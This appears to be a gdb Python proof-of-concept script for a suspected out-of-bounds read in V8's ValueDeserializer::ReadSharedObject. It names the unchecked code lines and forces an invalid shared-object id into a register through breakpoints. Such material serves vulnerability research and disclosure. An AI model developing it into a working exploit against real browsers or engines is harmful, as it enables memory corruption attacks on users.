"""
CVE-candidate: ValueDeserializer::ReadSharedObject OOB read
  value-serializer.cc:2686  GetPersisted(shared_object_id) — no bounds check
  shared-object-conveyor-handles.h:44  DCHECK-only, stripped in Release

Run:
  gdb -batch -ex "set pagination off" \
      -ex "source poc_readshared.py" \
      -ex "run --wasm-shared --allow-natives-syntax poc_readshared.js" \
      /tmp/d8_build_mca/d8
"""
import gdb

class _Inject(gdb.Breakpoint):
    def stop(self):
        gdb.execute("set $rax = 0xFFFF", to_string=True)
        print("[POC] id injected: 0xFFFF → OOB on size=1 conveyor")
        return False

class _Entry(gdb.Breakpoint):
    def stop(self):
        # entry_pc is function_start+16; +206 relative to function_start = entry+190
        _Inject(f"*{int(gdb.selected_frame().pc()) + 190}",
                temporary=True, internal=False)
        return False

_Entry("_ZN2v88internal17ValueDeserializer16ReadSharedObjectEv")
print("[POC] armed — running JS")
